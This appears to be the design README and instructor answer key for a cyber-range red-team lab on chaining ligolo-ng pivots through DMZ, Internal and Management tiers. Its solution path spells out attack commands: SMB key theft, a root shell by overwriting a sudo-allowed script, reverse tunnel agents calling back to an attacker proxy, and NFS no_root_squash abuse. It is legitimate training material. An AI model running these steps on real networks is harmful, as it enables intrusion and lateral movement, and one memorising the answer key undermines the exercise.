# cr-18-n5b — Multi-Tier Network Pivoting (Capstone)

Offensive / red-team hands-on lab. A trainee starts in a DMZ and must chain
two application-layer pivots (via **ligolo-ng**) and two file-service
misconfigurations to reach a flag on a Management host that no external
system can touch. Replaces two earlier designs — see *Design history* below.

- **Course code:** N5b
- **Type:** CR (Cyber Range)
- **Difficulty:** Expert
- **Duration:** 50 min
- **Audience:** Penetration Tester

---

## Topology

Three routed tiers, segmented by the router's firewall. Two hosts are
dual-homed and act as the only bridges between tiers — these are the pivots
the trainee must own.

| Host | Tier(s) | IP(s) | Role |
|------|---------|-------|------|
| `attacker` | DMZ | 10.10.10.10 | Trainee console; runs the ligolo-ng **proxy** |
| `dmzhost` | DMZ + Internal | 10.10.10.2 / 10.10.20.2 | SMB entry point; runs the first ligolo-ng **agent** |
| `appserver` | Internal | 10.10.20.20 | Mounts the NFS share; hosts the A5 pivot-proof flag |
| `nfsserver` | Internal + Management | 10.10.20.30 / 10.10.30.30 | Exports the misconfigured share; runs the second ligolo-ng **agent** |
| `mgmthost` | Management | 10.10.30.100 | Final target |
| `router` | all | .1 on each tier | Enforces segmentation |

```
attacker ── DMZ 10.10.10.0/24 ── dmzhost
 (ligolo proxy)                     │ dual-homed (ligolo agent #1)
                Internal 10.10.20.0/24
                  ├── appserver
                  └── nfsserver
                                    │ dual-homed (ligolo agent #2)
                Management 10.10.30.0/24
                  └── mgmthost
```

**Segmentation:** the router's FORWARD chain default-drops all inter-tier
traffic except Internal→Management. DMZ cannot reach Internal or Management
through the router at all — the attacker must pivot through `dmzhost` and
`nfsserver`. This is unaffected by the pivot-mechanism change below: none of
the actual attack traffic ever crosses the router (see next section).

`appserver`, `nfsserver`, and `mgmthost` are `hidden: true` — no console
access, reachable only over the network once pivoted to.

---

## Pivot mechanism: ligolo-ng (not IP forwarding)

**This design was changed after live testing on the platform.** The original
plan used kernel `ip_forward` + iptables `MASQUERADE` on the dual-homed
hosts. Testing found it **fails silently**: when the target replies, the
un-NAT'd packet leaving the DMZ-facing interface carries a source address
(`10.10.20.20`, the Internal target) that the DMZ Neutron port never owns.
Platform anti-spoofing drops it — invisible from inside the guest (`tcpdump`
on the guest shows the packet "leaving" normally), so the first symptom is
just silent, total packet loss on the return leg. This is very likely the
platform's port-security model and not something fixable from inside the
guest.

**ligolo-ng avoids this by design.** It doesn't forward IP packets — the
agent, running on the pivot host, receives a request over its own encrypted
control connection back to the proxy and then **originates a normal local
connection** to the target using its own real interface and IP. From
Neutron's point of view this is indistinguishable from any other outbound
connection the host makes — there is never a packet on the wire with a
foreign source address. It's the same reason SSH port-forwarding works on
this platform: both are connection relays, not packet forwarding.

**How the two hops work:**
- **Hop 1 (DMZ→Internal):** `dmzhost`'s agent connects back to `attacker`'s
  proxy — both on the DMZ subnet directly, no router involved. Once
  running, the trainee routes DMZ-tier traffic for `10.10.20.0/24` into the
  `ligolo` tun interface on `attacker`; the proxy relays it to the agent,
  which connects to the Internal target (e.g. `10.10.20.20`) from its own
  Internal IP (`10.10.20.2`) — again no router involved.
- **Hop 2 (Internal→Management):** the trainee adds a **listener** on the
  first agent session so a second agent (on `nfsserver`) can connect back
  to `dmzhost`'s Internal IP, tunneling all the way to the proxy. This
  chains the tunnel one tier deeper, using the same technique.

Both agent binaries and the proxy binary are **pre-staged by the playbook**
(`/opt/ligolo/agent` on `dmzhost`/`nfsserver`, `/opt/ligolo/proxy` on
`attacker`) — the trainee doesn't need to transfer files, only to run and
configure them. Pinned version: **v0.9.1** (verified working download URLs
at time of writing).

**Caveat:** downloading the binaries during provisioning requires the target
VMs to reach `github.com`/`release-assets.githubusercontent.com` at
build time. This should work the same way `apt install` already does on
these hosts (both need outbound internet from the provisioning network) —
but if your platform's provisioning network is more restricted than its apt
mirror access, these `get_url` tasks will fail. They're set to
`failed_when: false` so a failure won't abort the whole playbook, but the
lab won't be solvable without the binaries — check `/opt/ligolo/` exists on
each host after deployment. If blocked, host the two tarballs on infrastructure
you control and change the `get_url` URLs to point there.

---

## Deployment

```bash
ansible-playbook -i <inventory> playbook.yml
```

Play order matters: `dmzhost` must provision before it's attacked, and
`router` segmentation should be in place before the lab is handed to a
trainee. No cross-host `hostvars` dependencies — each host is self-contained.

### Dependencies

- **`ansible.posix`** collection — required for the router's `sysctl` task:
  `ansible-galaxy collection install ansible.posix`
- **`community.general`** — not required.
- Outbound internet from `attacker`, `dmzhost`, `nfsserver` during
  provisioning (ligolo-ng download) — see caveat above.

---

## Answer key

> Instructor reference — do not distribute to trainees.

| Level | Flag | Where | How it's obtained |
|-------|------|-------|--------------------|
| A3 | `smb_flag` | `/srv/public/smb_flag.txt` on dmzhost | Enumerate SMB (445), read guest share |
| A4 | `dmz_root_flag` | `/root/dmz_root_flag.txt` on dmzhost, root-only | Escalate via writable `netcheck.sh` + NOPASSWD sudo |
| A5 | `pivot_flag` | HTTP `:8080` on appserver (Internal-only) | Confirms DMZ→Internal ligolo-ng pivot works |
| A6 | `nfs_flag` | `/srv/share/.nfs_flag` on nfsserver, root-only, inside the export | NFS `no_root_squash` trust abuse |
| A7 | `mgmt_flag` | HTTP `:8080` on mgmthost | Confirms Internal→Management pivot + final reach |

All five flags are **APG-generated per sandbox** (`variables.yml`) — no fixed
strings, so answers can't be shared between trainees. Static credentials:
`dmzadmin` (key-based, key leaked via SMB).

---

## Solution path (reference)

**A3 — DMZ foothold (SMB)**
```bash
nmap -p 445 10.10.10.2
smbclient -N -L //10.10.10.2/
smbclient -N //10.10.10.2/public
# get id_rsa, get README.txt, get smb_flag.txt
chmod 600 id_rsa
ssh -i id_rsa dmzadmin@10.10.10.2
```

**A4 — Local escalation on dmzhost**
```bash
sudo -l
# -> (root) NOPASSWD: /opt/netcheck/netcheck.sh
ls -la /opt/netcheck/netcheck.sh          # world-writable

echo -e '#!/bin/bash\nbash -i' > /opt/netcheck/netcheck.sh
sudo /opt/netcheck/netcheck.sh
whoami; id                                 # must show uid=0(root), NOT just euid=0
cat /root/dmz_root_flag.txt
```
> **Use `bash -i` inside the sudo'd script, not `chmod +s /bin/bash`.** The
> SUID-bit approach gives *effective*-root only (`euid=0`, real `uid` stays
> `dmzadmin`) — several tools (confirmed with `nft`, likely others) check
> `getuid()`/`geteuid()` and refuse to run on that mismatch. Running the
> shell from inside a script `sudo` already elevated gives genuine `uid=0`.

**A5 — Pivot DMZ → Internal (ligolo-ng)**
```bash
# on attacker:
cd /opt/ligolo
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# on dmzhost (needs real root — see A4 note above):
cd /opt/ligolo
./agent -connect 10.10.10.10:11601 -ignore-cert

# back on the proxy console (attacker):
session                    # select the dmzhost agent
start                      # brings up the 'ligolo' tun interface

# new shell on attacker:
sudo ip route add 10.10.20.0/24 dev ligolo
curl http://10.10.20.20:8080/            # -> pivot_flag
```

**A6 — NFS trust abuse (Internal)**
```bash
# via the pivot (or directly on dmzhost as root):
showmount -e 10.10.20.30
mkdir /mnt/nfs && mount -t nfs 10.10.20.30:/srv/share /mnt/nfs
cat /mnt/nfs/.nfs_flag                     # readable — no_root_squash
                                            # preserves root identity from the client
```
Note: because the flag lives inside the export and the trainee is already
root on the mounting client (from A4), direct read works. The classic
no_root_squash technique — plant a root-owned SUID binary on the share and
execute it from a *different* client to gain root on that specific host — is
the more broadly applicable technique and worth teaching/demonstrating even
though this chain's flag doesn't strictly require it.

**A7 — Pivot Internal → Management + final capture (ligolo-ng, chained)**
```bash
# on the proxy console (still in the dmzhost session):
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# get a root shell on nfsserver (via the A6 NFS access), then:
cd /opt/ligolo
./agent -connect 10.10.20.2:11601 -ignore-cert

# back on the proxy console:
session                    # select the new nfsserver agent
start                      # switches/adds the tunnel

# on attacker:
sudo ip route add 10.10.30.0/24 dev ligolo
curl http://10.10.30.100:8080/             # -> mgmt_flag
```

---

## Design notes & caveats

- **Feasibility history (VLAN → routing → ligolo-ng):** this course was
  originally scoped around VLAN tagging/hopping (802.1Q, DTP switch-spoofing).
  A PoC confirmed the platform's Neutron fabric strips VLAN-tagged frames
  between VMs even on the same network — not achievable without OpenStack
  trunk ports/nested GNS3. Redesigned around routed subnets with
  IP-forwarding pivots; **that too was tested and found broken** (Neutron
  drops the un-NAT'd return traffic — see *Pivot mechanism* above). The
  course now uses **ligolo-ng**, an application-layer relay, which
  structurally avoids the anti-spoofing problem. See conversation history
  for both PoCs.

- **A4's escalation is intentionally narrow**, not general sudo. `dmzadmin`
  can run exactly one world-writable script as root
  (`/opt/netcheck/netcheck.sh`, NOPASSWD) — a second, genuine
  misconfiguration to find (`sudo -l` + writable script), separate from the
  leaked key.

- **The real-vs-effective-root lesson (A4) matters beyond this one step.**
  Any tool the trainee relies on later that checks real UID (some hardened
  network tools do) will silently misbehave under a SUID-only escalation.
  Worth calling out explicitly in the level's hints, not just the solution.

- **A6 flag placement simplifies the intended attack** — a trainee already
  root on a mounting client can read `nfs_flag` directly without the full
  plant-SUID-and-execute-on-another-host maneuver. Still demonstrates the
  trust relationship authentically; move the flag to require execution as a
  different user/host if you want to force the classic technique.

- **A4's ATT&CK technique is local, not network-based** (unlike every other
  step). Closest fit: **T1548.003 — Sudo and Sudo Caching**. Consider adding
  it to the course's ATT&CK list, or presenting A4 as a sub-step of A3.

- **Ligolo-ng binaries are pre-staged**, not something the trainee has to
  transfer — this is a deliberate simplification (parallel to N5a's
  pre-installed hydra/nmap). The graded skill is configuring and chaining
  the pivot, not file transfer.

- **Port 8080 is reused** by both the A5 (`appserver`) and A7 (`mgmthost`)
  services — harmless, different hosts.

### Suggested MITRE ATT&CK mapping

**T1046** (service discovery, every tier) · **T1133** (SMB as an exposed
external-facing service) · **T1199** (SMB key leak + NFS trust abuse) ·
**T1572** (both ligolo-ng pivots — arguably an even cleaner fit now than
under the old IP-forwarding design, since T1572 is literally "Protocol
Tunneling") · **T1068** (root via NFS no_root_squash) · **T1548.003** (A4
local escalation — see caveat above).

---

## Timing

Expert, 50 min. Two ligolo-ng pivots (10–12 min each incl. setup/recon) +
SMB enumeration (~8 min) + local escalation (~5 min) + NFS abuse (~8 min) +
final capture (~5 min) ≈ 46 min for an expert trainee working carefully
through the tunnel setup. The floor is dominated by correctly configuring
the two pivots, not recall.

| Level | Estimated |
|---|---|
| A3 — DMZ foothold (SMB) | ~8 min |
| A4 — Local escalation | ~5 min |
| A5 — Pivot DMZ→Internal | ~10 min |
| A6 — NFS trust abuse | ~8 min |
| A7 — Pivot Internal→Management + capture | ~12 min |
